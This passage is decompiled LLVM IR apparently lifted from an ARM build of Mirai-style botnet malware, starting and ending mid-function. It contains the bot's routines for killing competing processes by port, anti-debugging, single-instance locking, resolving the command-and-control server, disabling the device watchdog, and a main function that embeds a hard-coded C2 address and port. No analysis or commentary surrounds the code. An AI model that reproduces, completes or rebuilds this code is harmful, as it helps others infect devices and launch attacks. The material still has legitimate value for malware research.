  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d4d4 = call i32 @__libc_open(i32 %v1_cfb8, i32 0)
  %v7_d4d8 = icmp eq i32 %v2_d4d4, -1
  store i32 %v2_d4d4, i32* @r4, align 4
  br i1 %v7_d4d8, label %bb140, label %.thread12

bb140:                                            ; preds = %dec_label_pc_d4cc
  store i32 9, i32* @r1, align 4
  br label %.thread12

.thread12:                                        ; preds = %dec_label_pc_d4cc, %bb140
  store i32 ptrtoint (i32* @global_var_d4ec.77 to i32), i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_d4d8, i32 ptrtoint (i32* @global_var_10a64.76 to i32))
  %v0_d4ec = load i32, i32* @r4, align 4
  %v1_d4f0 = call i32 @__GI___libc_close(i32 %v0_d4ec)
  br label %dec_label_pc_d4f4

dec_label_pc_d4f4:                                ; preds = %dec_label_pc_d354, %.thread12
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d4fc = call i32 @__libc_open(i32 %v2_d380, i32 0)
  %v7_d500 = icmp eq i32 %v2_d4fc, -1
  store i32 %v2_d4fc, i32* %sl.global-to-local, align 4
  br i1 %v7_d500, label %dec_label_pc_d61c, label %dec_label_pc_d50c

dec_label_pc_d50c:                                ; preds = %dec_label_pc_d4f4
  %v1_d510 = call i32 @table_unlock_val(i32 18)
  %v1_d518 = call i32 @table_unlock_val(i32 19)
  store i32 %v2_d520, i32* %r1.global-to-local, align 4
  %v3_d528 = call i32 @table_retrieve_val(i32 18, i32* nonnull %stack_var_-44)
  store i32 %v2_d52c, i32* %r1.global-to-local, align 4
  store i32 %v3_d528, i32* @r6, align 4
  %v3_d538 = call i32 @table_retrieve_val(i32 19, i32* nonnull %stack_var_-48)
  store i32 %v3_d538, i32* @r7, align 4
  store i32 %v2_d544, i32* @r4, align 4
  %v0_d54856 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v2_d544, i32* @r1, align 4
  store i32 4096, i32* @r2, align 4
  %v1_d55457 = call i32 @__libc_read(i32 %v0_d54856)
  %tmp141 = icmp slt i32 %v1_d55457, 1
  br i1 %tmp141, label %dec_label_pc_d690, label %dec_label_pc_d560

dec_label_pc_d560:                                ; preds = %dec_label_pc_d50c, %dec_label_pc_d548.backedge
  %v0_d59447 = phi i32 [ %v1_d554, %dec_label_pc_d548.backedge ], [ %v1_d55457, %dec_label_pc_d50c ]
  %v3_d564 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d564, i32* @r5, align 4
  %v5_d56c = icmp slt i32 %v0_d59447, %v3_d564
  br i1 %v5_d56c, label %dec_label_pc_d57c, label %dec_label_pc_d5d0.lr.ph

dec_label_pc_d5d0.lr.ph:                          ; preds = %dec_label_pc_d560
  %v1_d5c839 = add i32 %v0_d59447, -1
  store i32 %v1_d5c839, i32* %r1.global-to-local, align 4
  %v0_d5d0.pre = load i32, i32* @r6, align 4
  %v1_d5d4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d5d0

dec_label_pc_d57c:                                ; preds = %dec_label_pc_d5c8.backedge, %dec_label_pc_d560
  store i32 %v2_d110, i32* %r1.global-to-local, align 4
  %v3_d580 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_d580, i32* @lr, align 4
  %v5_d588 = icmp slt i32 %v0_d59447, %v3_d580
  br i1 %v5_d588, label %dec_label_pc_d548.backedge, label %.thread25

dec_label_pc_d548.backedge:                       ; preds = %dec_label_pc_d5b0, %.thread25, %dec_label_pc_d57c
  %v0_d548 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v2_d544, i32* @r1, align 4
  store i32 4096, i32* @r2, align 4
  %v1_d554 = call i32 @__libc_read(i32 %v0_d548)
  %tmp142 = icmp slt i32 %v1_d554, 1
  br i1 %tmp142, label %dec_label_pc_d690, label %dec_label_pc_d560

.thread25:                                        ; preds = %dec_label_pc_d57c
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d59449 = icmp eq i32 %v0_d59447, 0
  br i1 %v2_d59449, label %dec_label_pc_d548.backedge, label %dec_label_pc_d59c.lr.ph

dec_label_pc_d59c.lr.ph:                          ; preds = %.thread25
  %v0_d59c.pre = load i32, i32* @r7, align 4
  %v1_d5a0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d59c

dec_label_pc_d59c:                                ; preds = %dec_label_pc_d5b0, %dec_label_pc_d59c.lr.ph
  %v0_d594.in = phi i32 [ %v0_d59447, %dec_label_pc_d59c.lr.ph ], [ %v0_d594, %dec_label_pc_d5b0 ]
  %v0_d5b0 = phi i32 [ 0, %dec_label_pc_d59c.lr.ph ], [ %v1_d5b0, %dec_label_pc_d5b0 ]
  %v1_d59c = phi i32 [ 0, %dec_label_pc_d59c.lr.ph ], [ %v1_d59c86, %dec_label_pc_d5b0 ]
  %v0_d594 = add i32 %v0_d594.in, -1
  %v2_d59c = add i32 %v1_d59c, %v0_d59c.pre
  %v3_d59c = inttoptr i32 %v2_d59c to i8*
  %v4_d59c = load i8, i8* %v3_d59c, align 1
  %v6_d59c = zext i8 %v4_d59c to i32
  store i32 %v6_d59c, i32* %r2.global-to-local, align 4
  %v2_d5a0 = add i32 %v0_d5b0, %v1_d5a0.pre
  %v3_d5a0 = inttoptr i32 %v2_d5a0 to i8*
  %v4_d5a0 = load i8, i8* %v3_d5a0, align 1
  %v6_d5a0 = zext i8 %v4_d5a0 to i32
  store i32 %v6_d5a0, i32* @r3, align 4
  %v9_d5a4 = icmp eq i8 %v4_d5a0, %v4_d59c
  br i1 %v9_d5a4, label %dec_label_pc_d5ec, label %bb143

bb143:                                            ; preds = %dec_label_pc_d59c
  br label %dec_label_pc_d5b0

dec_label_pc_d5b0:                                ; preds = %bb143, %dec_label_pc_d5ec
  %v1_d59c86 = phi i32 [ %v1_d5ec, %dec_label_pc_d5ec ], [ 0, %bb143 ]
  %v1_d5b0 = add i32 %v0_d5b0, 1
  store i32 %v1_d5b0, i32* %r1.global-to-local, align 4
  %v2_d594 = icmp eq i32 %v0_d594, 0
  br i1 %v2_d594, label %dec_label_pc_d548.backedge, label %dec_label_pc_d59c

dec_label_pc_d5b8:                                ; preds = %dec_label_pc_d5d0
  %v1_d5b8 = add i32 %v1_d5d0, 1
  store i32 %v1_d5b8, i32* @lr, align 4
  %v9_d5bc = icmp eq i32 %v3_d564, %v1_d5b8
  br i1 %v9_d5bc, label %dec_label_pc_d5f8, label %dec_label_pc_d5c8.backedge

dec_label_pc_d5c8.backedge:                       ; preds = %dec_label_pc_d5b8, %dec_label_pc_d5e4
  %v1_d5d077 = phi i32 [ 0, %dec_label_pc_d5e4 ], [ %v1_d5b8, %dec_label_pc_d5b8 ]
  %storemerge = add i32 %storemerge.in, 1
  %v1_d5c8 = add i32 %v0_d5c8, -1
  store i32 %v1_d5c8, i32* %r1.global-to-local, align 4
  %v2_d5c8 = icmp eq i32 %v0_d5c8, 0
  br i1 %v2_d5c8, label %dec_label_pc_d57c, label %dec_label_pc_d5d0

dec_label_pc_d5d0:                                ; preds = %dec_label_pc_d5c8.backedge, %dec_label_pc_d5d0.lr.ph
  %v0_d5c8 = phi i32 [ %v1_d5c839, %dec_label_pc_d5d0.lr.ph ], [ %v1_d5c8, %dec_label_pc_d5c8.backedge ]
  %storemerge.in = phi i32 [ 0, %dec_label_pc_d5d0.lr.ph ], [ %storemerge, %dec_label_pc_d5c8.backedge ]
  %v1_d5d0 = phi i32 [ 0, %dec_label_pc_d5d0.lr.ph ], [ %v1_d5d077, %dec_label_pc_d5c8.backedge ]
  %v2_d5d0 = add i32 %v1_d5d0, %v0_d5d0.pre
  %v3_d5d0 = inttoptr i32 %v2_d5d0 to i8*
  %v4_d5d0 = load i8, i8* %v3_d5d0, align 1
  %v6_d5d0 = zext i8 %v4_d5d0 to i32
  store i32 %v6_d5d0, i32* %r2.global-to-local, align 4
  %v2_d5d4 = add i32 %storemerge.in, %v1_d5d4.pre
  %v3_d5d4 = inttoptr i32 %v2_d5d4 to i8*
  %v4_d5d4 = load i8, i8* %v3_d5d4, align 1
  %v6_d5d4 = zext i8 %v4_d5d4 to i32
  store i32 %v6_d5d4, i32* @r3, align 4
  %v9_d5d8 = icmp eq i8 %v4_d5d4, %v4_d5d0
  br i1 %v9_d5d8, label %dec_label_pc_d5b8, label %dec_label_pc_d5e4

dec_label_pc_d5e4:                                ; preds = %dec_label_pc_d5d0
  br label %dec_label_pc_d5c8.backedge

dec_label_pc_d5ec:                                ; preds = %dec_label_pc_d59c
  %v1_d5ec = add i32 %v1_d59c, 1
  %v9_d5f0 = icmp eq i32 %v3_d580, %v1_d5ec
  br i1 %v9_d5f0, label %dec_label_pc_d5f8, label %dec_label_pc_d5b0

dec_label_pc_d5f8:                                ; preds = %dec_label_pc_d5b8, %dec_label_pc_d5ec
  %v1_d5fc = call i32 @table_lock_val(i32 18)
  %v1_d604 = call i32 @table_lock_val(i32 19)
  %v0_d608 = load i32, i32* %sl.global-to-local, align 4
  %v1_d60c = call i32 @__GI___libc_close(i32 %v0_d608)
  %v0_d610 = load i32, i32* @r8, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_d618 = call i32 @kill(i32 %v0_d610, i32 9)
  br label %dec_label_pc_d61c

dec_label_pc_d61c:                                ; preds = %dec_label_pc_d4f4, %dec_label_pc_d690, %dec_label_pc_d5f8
  store i32 %v2_d380, i32* @r0, align 4
  store i32 64, i32* @r1, align 4
  %v0_d624 = call i32 @util_zero()
  store i32 %v2_d3d0, i32* @r0, align 4
  store i32 64, i32* @r1, align 4
  %v0_d634 = call i32 @util_zero()
  %v1_d63c = call i32 @sleep(i32 1)
  store i32 %v2_d358, i32* @r7, align 4
  %v0_d644 = load i32, i32* @r8, align 4
  store i32 %v0_d644, i32* @sl, align 4
  br label %dec_label_pc_d2a8.backedge

dec_label_pc_d64c:                                ; preds = %dec_label_pc_d184
  %v1_d654 = call i32 @killer_kill_by_port(i32 42448)
  %v2_d658 = icmp eq i32 %v1_d654, 0
  br i1 %v2_d658, label %dec_label_pc_d660, label %dec_label_pc_d194

dec_label_pc_d660:                                ; preds = %dec_label_pc_d64c
  %v1_d664 = call i32 @killer_kill_by_port(i32 20480)
  %v2_d668 = icmp eq i32 %v1_d664, 0
  br i1 %v2_d668, label %dec_label_pc_d670, label %dec_label_pc_d194

dec_label_pc_d670:                                ; preds = %dec_label_pc_d660
  %v1_d678 = call i32 @killer_kill_by_port(i32 34254)
  %v2_d67c = icmp eq i32 %v1_d678, 0
  br i1 %v2_d67c, label %dec_label_pc_d684, label %dec_label_pc_d194

dec_label_pc_d684:                                ; preds = %dec_label_pc_d670
  %v0_d684 = load i32, i32* @r5, align 4
  %v1_d688 = call i32 @killer_kill_by_port(i32 %v0_d684)
  br label %dec_label_pc_d194

dec_label_pc_d690:                                ; preds = %dec_label_pc_d548.backedge, %dec_label_pc_d50c
  %v1_d694 = call i32 @table_lock_val(i32 18)
  %v1_d69c = call i32 @table_lock_val(i32 19)
  %v0_d6a0 = load i32, i32* %sl.global-to-local, align 4
  %v1_d6a4 = call i32 @__GI___libc_close(i32 %v0_d6a0)
  br label %dec_label_pc_d61c

; uselistorder directives
  uselistorder i32 %v1_d5ec, { 1, 0 }
  uselistorder i32 %v1_d5b0, { 1, 0 }
  uselistorder i32 %v1_d59c, { 1, 0 }
  uselistorder i32 %v0_d5b0, { 1, 0 }
  uselistorder i32 %v1_d554, { 1, 0 }
  uselistorder i32 %v2_d4fc, { 1, 0 }
  uselistorder i1 %v7_d4d8, { 1, 0 }
  uselistorder i32 %v2_d4d4, { 1, 0 }
  uselistorder i32 %v2_d2ac, { 1, 0 }
  uselistorder i32 %stack_var_-8484.1.be, { 1, 0 }
  uselistorder i32 %v3_d42c, { 1, 2, 0 }
  uselistorder i32 %v2_d33c, { 1, 0 }
  uselistorder i32 %v1_d2dc, { 0, 1, 5, 4, 3, 2, 6, 9, 8, 7 }
  uselistorder i32 %v1_d2b8, { 2, 1, 0, 3 }
  uselistorder i32 %v3_d27c, { 1, 2, 0 }
  uselistorder i32 %v3_d244, { 1, 2, 0 }
  uselistorder i32 %v3_d210, { 1, 2, 0 }
  uselistorder i32 %v3_d1d8, { 1, 2, 0 }
  uselistorder i32 %v3_d1a0, { 2, 1, 0 }
  uselistorder i32 %v3_d158, { 1, 2, 0 }
  uselistorder i32 %stack_var_-8484.0, { 1, 0 }
  uselistorder i32 %v2_d544, { 1, 0, 2 }
  uselistorder i32 %v2_d3d0, { 1, 0, 2 }
  uselistorder i32 %v3_d050, { 1, 0 }
  uselistorder i32 %v2_d01c, { 2, 0, 1 }
  uselistorder i32 %v3_cfc8, { 1, 0 }
  uselistorder i32 %v1_cfb8, { 3, 2, 0, 4, 6, 5, 8, 7, 9, 10, 1, 11, 12, 13 }
  uselistorder i32 %storemerge96, { 1, 0 }
  uselistorder i32 %v0_cf28, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2 }
  uselistorder i32* %stack_var_-44, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 3, 2, 53, 4, 0, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14, 16, 17, 18, 20, 19, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 48, 47, 49, 50, 51, 52 }
  uselistorder i32 (i32, i32)* @kill, { 3, 2, 1, 0 }
  uselistorder i32 (i32*)* @__GI_readdir, { 4, 3, 0, 5, 6, 7, 2, 8, 1 }
  uselistorder i32 20480, { 0, 2, 1 }
  uselistorder i32 (i32)* @__GI_opendir, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @readlink, { 3, 2, 1, 0 }
  uselistorder i32 4095, { 1, 0, 2, 3 }
  uselistorder i32* @global_var_243d4.73, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_d61c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_d5f8, { 1, 0 }
  uselistorder label %dec_label_pc_d5c8.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_d5b0, { 1, 0 }
  uselistorder label %dec_label_pc_d560, { 1, 0 }
  uselistorder label %dec_label_pc_d4f4, { 1, 0 }
  uselistorder label %.thread12, { 1, 0 }
  uselistorder label %dec_label_pc_d2a8.backedge, { 4, 3, 0, 1, 5, 2 }
  uselistorder label %dec_label_pc_d488, { 1, 0 }
  uselistorder label %dec_label_pc_d2b8, { 1, 0 }
  uselistorder label %dec_label_pc_d2b8.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_d270, { 1, 0 }
  uselistorder label %dec_label_pc_d238, { 1, 0 }
  uselistorder label %dec_label_pc_d204, { 1, 0 }
  uselistorder label %dec_label_pc_d1cc, { 1, 0 }
  uselistorder label %dec_label_pc_d194, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_d184, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
}

define i32 @anti_gdb_entry(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_d834.79 to i32), i32* @global_var_21744.81, align 4
  ret i32 %arg1
}

define i32 @ensure_single_instance(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v9_d6d4 = load i32, i32* @r6, align 4
  %v12_d6d4 = load i32, i32* @r7, align 4
  %v15_d6d4 = load i32, i32* @r8, align 4
  store i32 1, i32* @r4, align 4
  store i32 1, i32* %stack_var_-28, align 4
  %v3_d6f0 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 ptrtoint (i32* @global_var_2173c.83 to i32), i32* @r6, align 4
  %v7_d6f8 = icmp eq i32 %v3_d6f0, -1
  store i32 %v3_d6f0, i32* @global_var_2173c.83, align 4
  br i1 %v7_d6f8, label %dec_label_pc_d7b0, label %dec_label_pc_d704

dec_label_pc_d704:                                ; preds = %entry
  %v2_d704 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_d704, i32* @r3, align 4
  %v0_d708 = load i32, i32* @r4, align 4
  store i32 4, i32* @r5, align 4
  %v5_d718 = call i32 @__GI_setsockopt(i32 %v3_d6f0, i32 %v0_d708, i32 2, i32 %v2_d704, i32 4)
  %v2_d71c = load i32, i32* @global_var_2173c.83, align 4
  store i32 %v2_d71c, i32* @r4, align 4
  store i32 0, i32* @r2, align 4
  %v2_d72c = call i32 @__libc_fcntl(i32 %v2_d71c, i32 3)
  %v0_d730 = load i32, i32* @r5, align 4
  %v1_d734 = or i32 %v2_d72c, 2048
  store i32 %v1_d734, i32* @r2, align 4
  %v0_d738 = load i32, i32* @r4, align 4
  %v2_d73c = call i32 @__libc_fcntl(i32 %v0_d738, i32 %v0_d730)
  store i32 ptrtoint (i8** @global_var_21748.85 to i32), i32* @r8, align 4
  %v2_d744 = load i8, i8* bitcast (i8** @global_var_21748.85 to i8*), align 4
  %v2_d748 = icmp eq i8 %v2_d744, 0
  br i1 %v2_d748, label %.thread2, label %bb

.thread2:                                         ; preds = %dec_label_pc_d704
  br label %bb20

bb:                                               ; preds = %dec_label_pc_d704
  br label %bb20

bb20:                                             ; preds = %.thread2, %bb
  %v0_d76c = call i32 @__GI___errno_location()
  store i32 0, i32* @r7, align 4
  %v2_d774 = inttoptr i32 %v0_d76c to i32*
  store i32 0, i32* %v2_d774, align 4
  %v2_d778 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_d778, i32* @r5, align 4
  store i32 %v0_d76c, i32* %r4.global-to-local, align 4
  %v2_d788 = load i32, i32* @global_var_2173c.83, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v3_d794 = call i32 @bind(i32 %v2_d788, i32 %v2_d778, i32 16)
  %v7_d798 = icmp eq i32 %v3_d794, -1
  br i1 %v7_d798, label %dec_label_pc_d7bc, label %dec_label_pc_d7a0

dec_label_pc_d7a0:                                ; preds = %bb20
  %v2_d7a8 = load i32, i32* @global_var_2173c.83, align 4
  %v2_d7ac = call i32 @listen(i32 %v2_d7a8, i32 1)
  br label %dec_label_pc_d7b0

dec_label_pc_d7b0:                                ; preds = %entry, %dec_label_pc_d7c8, %dec_label_pc_d7a0
  %v1_d7b8 = phi i32 [ %v3_d6f0, %entry ], [ %v1_d80c, %dec_label_pc_d7c8 ], [ %v2_d7ac, %dec_label_pc_d7a0 ]
  store i32 %v9_d6d4, i32* @r6, align 4
  store i32 %v12_d6d4, i32* @r7, align 4
  store i32 %v15_d6d4, i32* @r8, align 4
  ret i32 %v1_d7b8

dec_label_pc_d7bc:                                ; preds = %bb20
  %v0_d7bc = load i32, i32* %r4.global-to-local, align 4
  %v1_d7bc = inttoptr i32 %v0_d7bc to i32*
  %v2_d7bc = load i32, i32* %v1_d7bc, align 4
  %v7_d7c0 = icmp eq i32 %v2_d7bc, 99
  br i1 %v7_d7c0, label %dec_label_pc_d814, label %dec_label_pc_d7c8

dec_label_pc_d7c8:                                ; preds = %dec_label_pc_d814, %bb21, %dec_label_pc_d7bc
  store i32 9510, i32* @r4, align 4
  %v2_d7e0 = load i32, i32* @global_var_2173c.83, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v3_d7f0 = call i32 @__libc_connect(i32 %v2_d7e0, i32 %v2_d778, i32 16)
  %v1_d7f8 = call i32 @sleep(i32 5)
  %v2_d7fc = load i32, i32* @global_var_2173c.83, align 4
  %v1_d800 = call i32 @__GI___libc_close(i32 %v2_d7fc)
  %v0_d804 = load i32, i32* @r4, align 4
  %v1_d808 = call i32 @killer_kill_by_port(i32 %v0_d804)
  %v1_d80c = call i32 @ensure_single_instance(i32 %v1_d808)
  br label %dec_label_pc_d7b0

dec_label_pc_d814:                                ; preds = %dec_label_pc_d7bc
  %v2_d814 = load i8, i8* bitcast (i8** @global_var_21748.85 to i8*), align 4
  %v3_d814 = zext i8 %v2_d814 to i32
  %v1_d818 = load i32, i32* @r7, align 4
  %v9_d818 = icmp eq i32 %v3_d814, %v1_d818
  br i1 %v9_d818, label %dec_label_pc_d7c8, label %bb21

bb21:                                             ; preds = %dec_label_pc_d814
  %v2_d820 = trunc i32 %v1_d818 to i8
  store i8 %v2_d820, i8* bitcast (i8** @global_var_21748.85 to i8*), align 4
  br label %dec_label_pc_d7c8

; uselistorder directives
  uselistorder i32 %v2_d778, { 1, 0, 2 }
  uselistorder i32 %v3_d6f0, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32 (i32)* @killer_kill_by_port, { 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @listen, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @bind, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_21748.85 to i8*), { 0, 2, 1 }
  uselistorder i8** @global_var_21748.85, { 1, 0 }
  uselistorder label %dec_label_pc_d7c8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d7b0, { 1, 2, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @resolve_cnc_addr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_d83c = call i32 @table_unlock_val(i32 1)
  store i32 ptrtoint ([15 x i8]* @global_var_18fcc.88 to i32), i32* @r0, align 4
  %v2_d844 = call i32 @inet_addr(i32 ptrtoint ([15 x i8]* @global_var_18fcc.88 to i32))
  store i32 ptrtoint (i16** @global_var_243dc.90 to i32), i32* @r4, align 4
  store i32 %v2_d844, i32* @global_var_243e0.91, align 4
  %v3_d858 = call i32 @table_retrieve_val(i32 1, i32* null)
  %v4_d858 = inttoptr i32 %v3_d858 to i16*
  %v3_d85c = load i16, i16* %v4_d858, align 2
  store i16 %v3_d85c, i16* bitcast (i32* @global_var_243de.92 to i16*), align 4
  %v1_d868 = call i32 @table_lock_val(i32 1)
  ret i32 %v1_d868
}

define i32 @watchdog_maintain(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_d87c = load i32, i32* @r4, align 4
  %v6_d87c = load i32, i32* @r5, align 4
  %v0_d884 = call i32 @__libc_fork()
  %v7_d888 = icmp eq i32 %v0_d884, -1
  %. = zext i1 %v7_d888 to i32
  %tmp12 = icmp slt i32 %v0_d884, 1
  %storemerge4 = select i1 %tmp12, i32 %., i32 1
  store i32 %storemerge4, i32* @r5, align 4
  %v2_d8a4 = icmp eq i32 %storemerge4, 0
  store i32 %v0_d884, i32* @global_var_218bc.94, align 4
  br i1 %v2_d8a4, label %dec_label_pc_d8bc, label %dec_label_pc_d8b0

dec_label_pc_d8b0:                                ; preds = %entry
  store i32 %v3_d87c, i32* @r4, align 4
  store i32 %v6_d87c, i32* @r5, align 4
  ret i32 %v0_d884

dec_label_pc_d8bc:                                ; preds = %entry
  store i32 1, i32* %stack_var_-20, align 4
  %v1_d8c8 = call i32 @table_unlock_val(i32 23)
  %v1_d8d0 = call i32 @table_unlock_val(i32 24)
  %v0_d8d4 = load i32, i32* @r5, align 4
  %v2_d8dc = inttoptr i32 %v0_d8d4 to i32*
  %v3_d8dc = call i32 @table_retrieve_val(i32 23, i32* %v2_d8dc)
  %v2_d8e4 = call i32 @__libc_open(i32 %v3_d8dc, i32 2)
  %v7_d8e8 = icmp eq i32 %v2_d8e4, -1
  store i32 %v2_d8e4, i32* @r4, align 4
  br i1 %v7_d8e8, label %dec_label_pc_d930, label %dec_label_pc_d8f4

dec_label_pc_d8f4:                                ; preds = %dec_label_pc_d930, %dec_label_pc_d8bc
  %v0_d900 = phi i32 [ %v3_d940, %dec_label_pc_d930 ], [ %v2_d8e4, %dec_label_pc_d8bc ]
  %v2_d904 = ptrtoint i32* %stack_var_-20 to i32
  %v3_d908 = call i32 @ioctl(i32 %v0_d900, i32 -2147199228, i32 %v2_d904)
  br label %dec_label_pc_d90c

dec_label_pc_d90c:                                ; preds = %dec_label_pc_d90c, %dec_label_pc_d8f4
  %v0_d918 = load i32, i32* @r4, align 4
  %v3_d920 = call i32 @ioctl(i32 %v0_d918, i32 -2147199227, i32 0)
  %v1_d928 = call i32 @sleep(i32 10)
  br label %dec_label_pc_d90c

dec_label_pc_d930:                                ; preds = %dec_label_pc_d8bc
  %v0_d930 = load i32, i32* @r5, align 4
  %v2_d938 = inttoptr i32 %v0_d930 to i32*
  %v3_d938 = call i32 @table_retrieve_val(i32 24, i32* %v2_d938)
  %v3_d940 = call i32 @__libc_open(i32 %v3_d938, i32 2)
  %v3_d944 = icmp eq i32 %v3_d940, -1
  store i32 %v3_d940, i32* @r4, align 4
  br i1 %v3_d944, label %dec_label_pc_d950, label %dec_label_pc_d8f4

dec_label_pc_d950:                                ; preds = %dec_label_pc_d930
  %v1_d954 = call i32 @table_lock_val(i32 23)
  %v1_d95c = call i32 @table_lock_val(i32 24)
  %v0_d960 = load i32, i32* @r5, align 4
  %v1_d964 = call i32 @__GI_exit(i32 %v0_d960)
  %v0_d968 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_d968, label %bb15, label %bb16

bb15:                                             ; preds = %dec_label_pc_d950
  store i16 2, i16* %arg1, align 2
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_d950, %bb15
  ret i32 %v1_d964

; uselistorder directives
  uselistorder i32 %v3_d940, { 1, 2, 0 }
  uselistorder i32 %v2_d8e4, { 1, 2, 0 }
  uselistorder i32 %storemerge4, { 1, 0 }
  uselistorder i32 %v0_d884, { 3, 2, 1, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8** %argv to i32
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-1416 = alloca i32, align 4
  %stack_var_-42 = alloca i8*, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-392 = alloca i32, align 4
  %stack_var_-264 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %v2_d978 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_d978, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 %argc, i32* @r6, align 4
  store i32 %tmp, i32* @r8, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %v2_d990 = call i32 @sigemptyset(i32* nonnull %stack_var_-64)
  store i32 %v2_d978, i32* @r0, align 4
  %v2_d99c = call i32 @__GI_sigaddset(i32 %v2_d978, i32 2)
  %v0_d9a0 = load i32, i32* @r5, align 4
  store i32 %v0_d9a0, i32* %r2.global-to-local, align 4
  %v4_d9ac = call i32 @__GI_sigprocmask(i32 %v0_d9a0, i32* nonnull %stack_var_-64, i32 %v0_d9a0)
  %v2_d9b8 = call i32 @bsd_signal(i32 17, i32 1)
  %v2_d9c4 = call i32 @bsd_signal(i32 5, i32 54972)
  %v0_d9c8 = call i32 @util_local_addr()
  store i32 ptrtoint (i16** @global_var_243dc.90 to i32), i32* %r2.global-to-local, align 4
  store i32 1494907824, i32* @global_var_243e0.91, align 4
  store i32 2, i32* %ip.global-to-local, align 4
  store i32 5888, i32* %r3.global-to-local, align 4
  store i32 %v0_d9c8, i32* @global_var_243d0.55, align 4
  store i16 5888, i16* bitcast (i32* @global_var_243de.92 to i16*), align 4
  store i16 2, i16* bitcast (i16** @global_var_243dc.90 to i16*), align 4
  %v6_d9f0 = call i32 @table_init(i32 %v0_d9c8, i32 ptrtoint (i32* @global_var_243d0.55 to i32), i32 ptrtoint (i16** @global_var_243dc.90 to i32), i32 5888)
  store i32 ptrtoint (i32* @global_var_d834.79 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21744.81 to i32), i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_d834.79 to i32), i32* @global_var_21744.81, align 4
  %v1_da00 = call i32 @ensure_single_instance(i32 %v6_d9f0)
  %v1_da04 = call i32 @rand_init(i32 %v1_da00)
  %v2_da0c = ptrtoint i32* %stack_var_-136 to i32
  store i32 %v2_da0c, i32* @r0, align 4
  store i32 32, i32* @r1, align 4
  %v0_da14 = call i32 @util_zero()
  %v0_da18 = load i32, i32* @r6, align 4
  %v7_da18 = icmp eq i32 %v0_da18, 2
  br i1 %v7_da18, label %dec_label_pc_db50, label %dec_label_pc_da20

dec_label_pc_da20:                                ; preds = %dec_label_pc_db50, %entry, %dec_label_pc_db60
  %v0_da20 = call i32 @rand_next()
  store i32 %v0_da20, i32* @r6, align 4
  %v0_da28 = load i32, i32* @r8, align 4
  %v1_da28 = inttoptr i32 %v0_da28 to i32*
  %v2_da28 = load i32, i32* %v1_da28, align 4
  %v1_da2c = inttoptr i32 %v2_da28 to i8*
  %v2_da2c = call i32 @util_strlen(i8* %v1_da2c)
  %v0_da34 = load i32, i32* @r8, align 4
  %v1_da34 = inttoptr i32 %v0_da34 to i32*
  %v2_da34 = load i32, i32* %v1_da34, align 4
  %v1_da38 = inttoptr i32 %v2_da34 to i8*
  %v2_da38 = call i32 @util_strlen(i8* %v1_da38)
  %v1_da3c = sub i32 20, %v2_da2c
  %v0_da44 = load i32, i32* @r6, align 4
  %v3_da48 = urem i32 %v0_da44, %v1_da3c
  %v2_da50 = ptrtoint i32* %stack_var_-104 to i32
